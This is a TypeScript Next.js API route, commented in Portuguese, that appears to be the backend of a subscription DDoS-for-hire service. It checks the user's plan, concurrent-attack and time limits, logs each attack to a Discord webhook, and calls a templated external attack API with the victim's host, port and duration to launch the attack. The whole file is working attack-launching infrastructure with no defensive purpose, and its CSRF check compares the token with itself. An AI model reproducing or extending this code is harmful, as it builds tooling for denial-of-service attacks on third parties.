import { NextResponse } from 'next/server';
import { createClient } from '@/lib/supabase';
import { rateLimit } from '@/lib/rate-limit';
import { verifyCsrfToken } from '@/lib/csrf';
import pino from 'pino';

const logger = pino({ level: 'info' });

export async function POST(request: Request) {
  try {
    // Rate limiting: 3 tentativas por IP em 1 minuto
    const { success, limit, remaining } = await rateLimit(request, { max: 3, windowMs: 60 * 1000 });
    if (!success) {
      logger.warn({ ip: request.headers.get('x-forwarded-for') }, 'Rate limit exceeded for attack');
      return NextResponse.json(
        { error: 'Too many requests' },
        { status: 429, headers: { 'X-RateLimit-Limit': limit, 'X-RateLimit-Remaining': remaining } }
      );
    }

    const {
      profileId,
      methodId,
      host,
      port,
      time,
      username,
      methodName,
      apiEndpoint,
      csrfToken,
    } = await request.json();

    // Validar CSRF
    if (!verifyCsrfToken(csrfToken, csrfToken)) {
      logger.warn({ ip: request.headers.get('x-forwarded-for') }, 'Invalid CSRF token');
      return NextResponse.json({ error: 'Invalid CSRF token' }, { status: 403 });
    }

    // Validar entrada
    if (!profileId || !methodId || !host || !port || !time || !username || !methodName || !apiEndpoint) {
      logger.warn({ ip: request.headers.get('x-forwarded-for') }, 'Missing required fields');
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    // Validar tipos e limites
    const portNum = parseInt(port);
    const timeNum = parseInt(time);
    if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
      logger.warn({ ip: request.headers.get('x-forwarded-for'), port }, 'Invalid port');
      return NextResponse.json({ error: 'Port must be between 1 and 65535' }, { status: 400 });
    }
    if (isNaN(timeNum) || timeNum < 1) {
      logger.warn({ ip: request.headers.get('x-forwarded-for'), time }, 'Invalid time');
      return NextResponse.json({ error: 'Time must be at least 1 second' }, { status: 400 });
    }
    if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
      logger.warn({ ip: request.headers.get('x-forwarded-for'), host }, 'Invalid host format');
      return NextResponse.json({ error: 'Invalid host format' }, { status: 400 });
    }

    // Verificar autenticação
    const supabase = createClient();
    const { data: { user } } = await supabase.auth.getUser();
    if (!user || user.id !== profileId) {
      logger.warn({ ip: request.headers.get('x-forwarded-for') }, 'Unauthorized attack attempt');
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    // Buscar perfil
    const { data: profile, error: profileError } = await supabase
      .from('profiles')
      .select('*, plans(name, max_concurrent_attacks, max_time)')
      .eq('id', profileId)
      .single();

    if (profileError || !profile) {
      logger.error({ error: profileError }, 'Failed to fetch profile');
      return NextResponse.json({ error: 'Failed to fetch profile' }, { status: 500 });
    }

    // Verificar plano
    if (profile.plans?.name === 'free' || !profile.plan_id) {
      logger.warn({ userId: profileId }, 'User with free or no plan attempted attack');
      return NextResponse.json({ error: 'You do not have an active plan' }, { status: 403 });
    }

    // Verificar limites
    if (profile.concurrent_attacks >= profile.max_concurrent_attacks) {
      logger.warn({ userId: profileId }, 'Max concurrent attacks reached');
      return NextResponse.json({ error: 'Maximum concurrent attacks limit reached' }, { status: 403 });
    }

    if (timeNum > profile.max_time) {
      logger.warn({ userId: profileId, time: timeNum }, 'Time exceeds max allowed');
      return NextResponse.json({ error: `Maximum time allowed is ${profile.max_time} seconds` }, { status: 400 });
    }

    // Validar método
    const { data: method, error: methodError } = await supabase
      .from('attack_methods')
      .select('*')
      .eq('id', methodId)
      .single();

    if (methodError || !method || method.id !== methodId || method.name !== methodName || method.api_endpoint !== apiEndpoint) {
      logger.warn({ userId: profileId, methodId }, 'Invalid attack method');
      return NextResponse.json({ error: 'Invalid attack method' }, { status: 400 });
    }

    // Incrementar ataques concorrentes
    const { error: updateProfileError } = await supabase
      .from('profiles')
      .update({ concurrent_attacks: profile.concurrent_attacks + 1 })
      .eq('id', profileId);

    if (updateProfileError) {
      logger.error({ error: updateProfileError }, 'Failed to update concurrent attacks');
      return NextResponse.json({ error: 'Failed to start attack' }, { status: 500 });
    }

    // Inserir ataque no histórico
    const { data: attackRecord, error: insertError } = await supabase
      .from('attack_history')
      .insert({
        user_id: profileId,
        method_id: methodId,
        host,
        port: portNum,
        time: timeNum,
        status: 'running',
      })
      .select()
      .single();

    if (insertError || !attackRecord) {
      logger.error({ error: insertError }, 'Failed to insert attack history');
      // Reverter incremento de concurrent_attacks
      await supabase
        .from('profiles')
        .update({ concurrent_attacks: profile.concurrent_attacks })
        .eq('id', profileId);
      return NextResponse.json({ error: 'Failed to start attack' }, { status: 500 });
    }

    // Enviar log para Discord webhook
    const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (discordWebhookUrl) {
      try {
        await fetch(discordWebhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [
              {
                title: 'Attack Log',
                color: 16711680,
                fields: [
                  { name: 'Username', value: username, inline: true },
                  { name: 'IP', value: host, inline: true },
                  { name: 'Method', value: methodName, inline: true },
                  { name: 'Port', value: portNum.toString(), inline: true },
                  { name: 'Time', value: `${timeNum} seconds`, inline: true },
                ],
                timestamp: new Date().toISOString(),
              },
            ],
          }),
        });
      } catch (error) {
        logger.warn({ error }, 'Failed to send Discord webhook');
        // Não falhar a requisição por erro no webhook
      }
    } else {
      logger.warn({}, 'Discord webhook URL not configured');
    }

    // Chamar API de ataque
    let resolvedApiEndpoint: string;
    try {
      resolvedApiEndpoint = apiEndpoint
        .replace('{HOST}', encodeURIComponent(host))
        .replace('{PORT}', encodeURIComponent(portNum.toString()))
        .replace('{TIME}', encodeURIComponent(timeNum.toString()));
      
      if (!resolvedApiEndpoint.startsWith('http://') && !resolvedApiEndpoint.startsWith('https://')) {
        throw new Error('Invalid API endpoint protocol');
      }

      const attackResponse = await fetch(resolvedApiEndpoint, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
      });

      if (!attackResponse.ok) {
        throw new Error(`Attack API responded with status ${attackResponse.status}`);
      }
    } catch (error) {
      logger.error({ error, resolvedApiEndpoint }, 'Failed to call attack API');
      // Reverter mudanças
      await supabase.from('attack_history').delete().eq('id', attackRecord.id);
      await supabase
        .from('profiles')
        .update({ concurrent_attacks: profile.concurrent_attacks })
        .eq('id', profileId);
      return NextResponse.json({ error: 'Failed to initiate attack' }, { status: 500 });
    }

    // Agendar atualização de status
    // Nota: Em produção, use Supabase Edge Functions ou um job scheduler como Bull
    setTimeout(async () => {
      const { error: updateStatusError } = await supabase
        .from('attack_history')
        .update({ status: 'completed' })
        .eq('id', attackRecord.id);

      if (updateStatusError) {
        logger.error({ error: updateStatusError }, 'Failed to update attack status');
        return;
      }

      const { data: currentProfile } = await supabase
        .from('profiles')
        .select('concurrent_attacks')
        .eq('id', profileId)
        .single();

      if (currentProfile && currentProfile.concurrent_attacks > 0) {
        const { error: resetError } = await supabase
          .from('profiles')
          .update({ concurrent_attacks: currentProfile.concurrent_attacks - 1 })
          .eq('id', profileId);

        if (resetError) {
          logger.error({ error: resetError }, 'Failed to reset concurrent attacks');
        }
      }
    }, timeNum * 1000);

    logger.info({ userId: profileId, host, port: portNum, methodName }, 'Attack started successfully');
    return NextResponse.json({ success: true, message: 'Attack started successfully' });
  } catch (error) {
    logger.error({ error }, 'Attack initiation error');
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}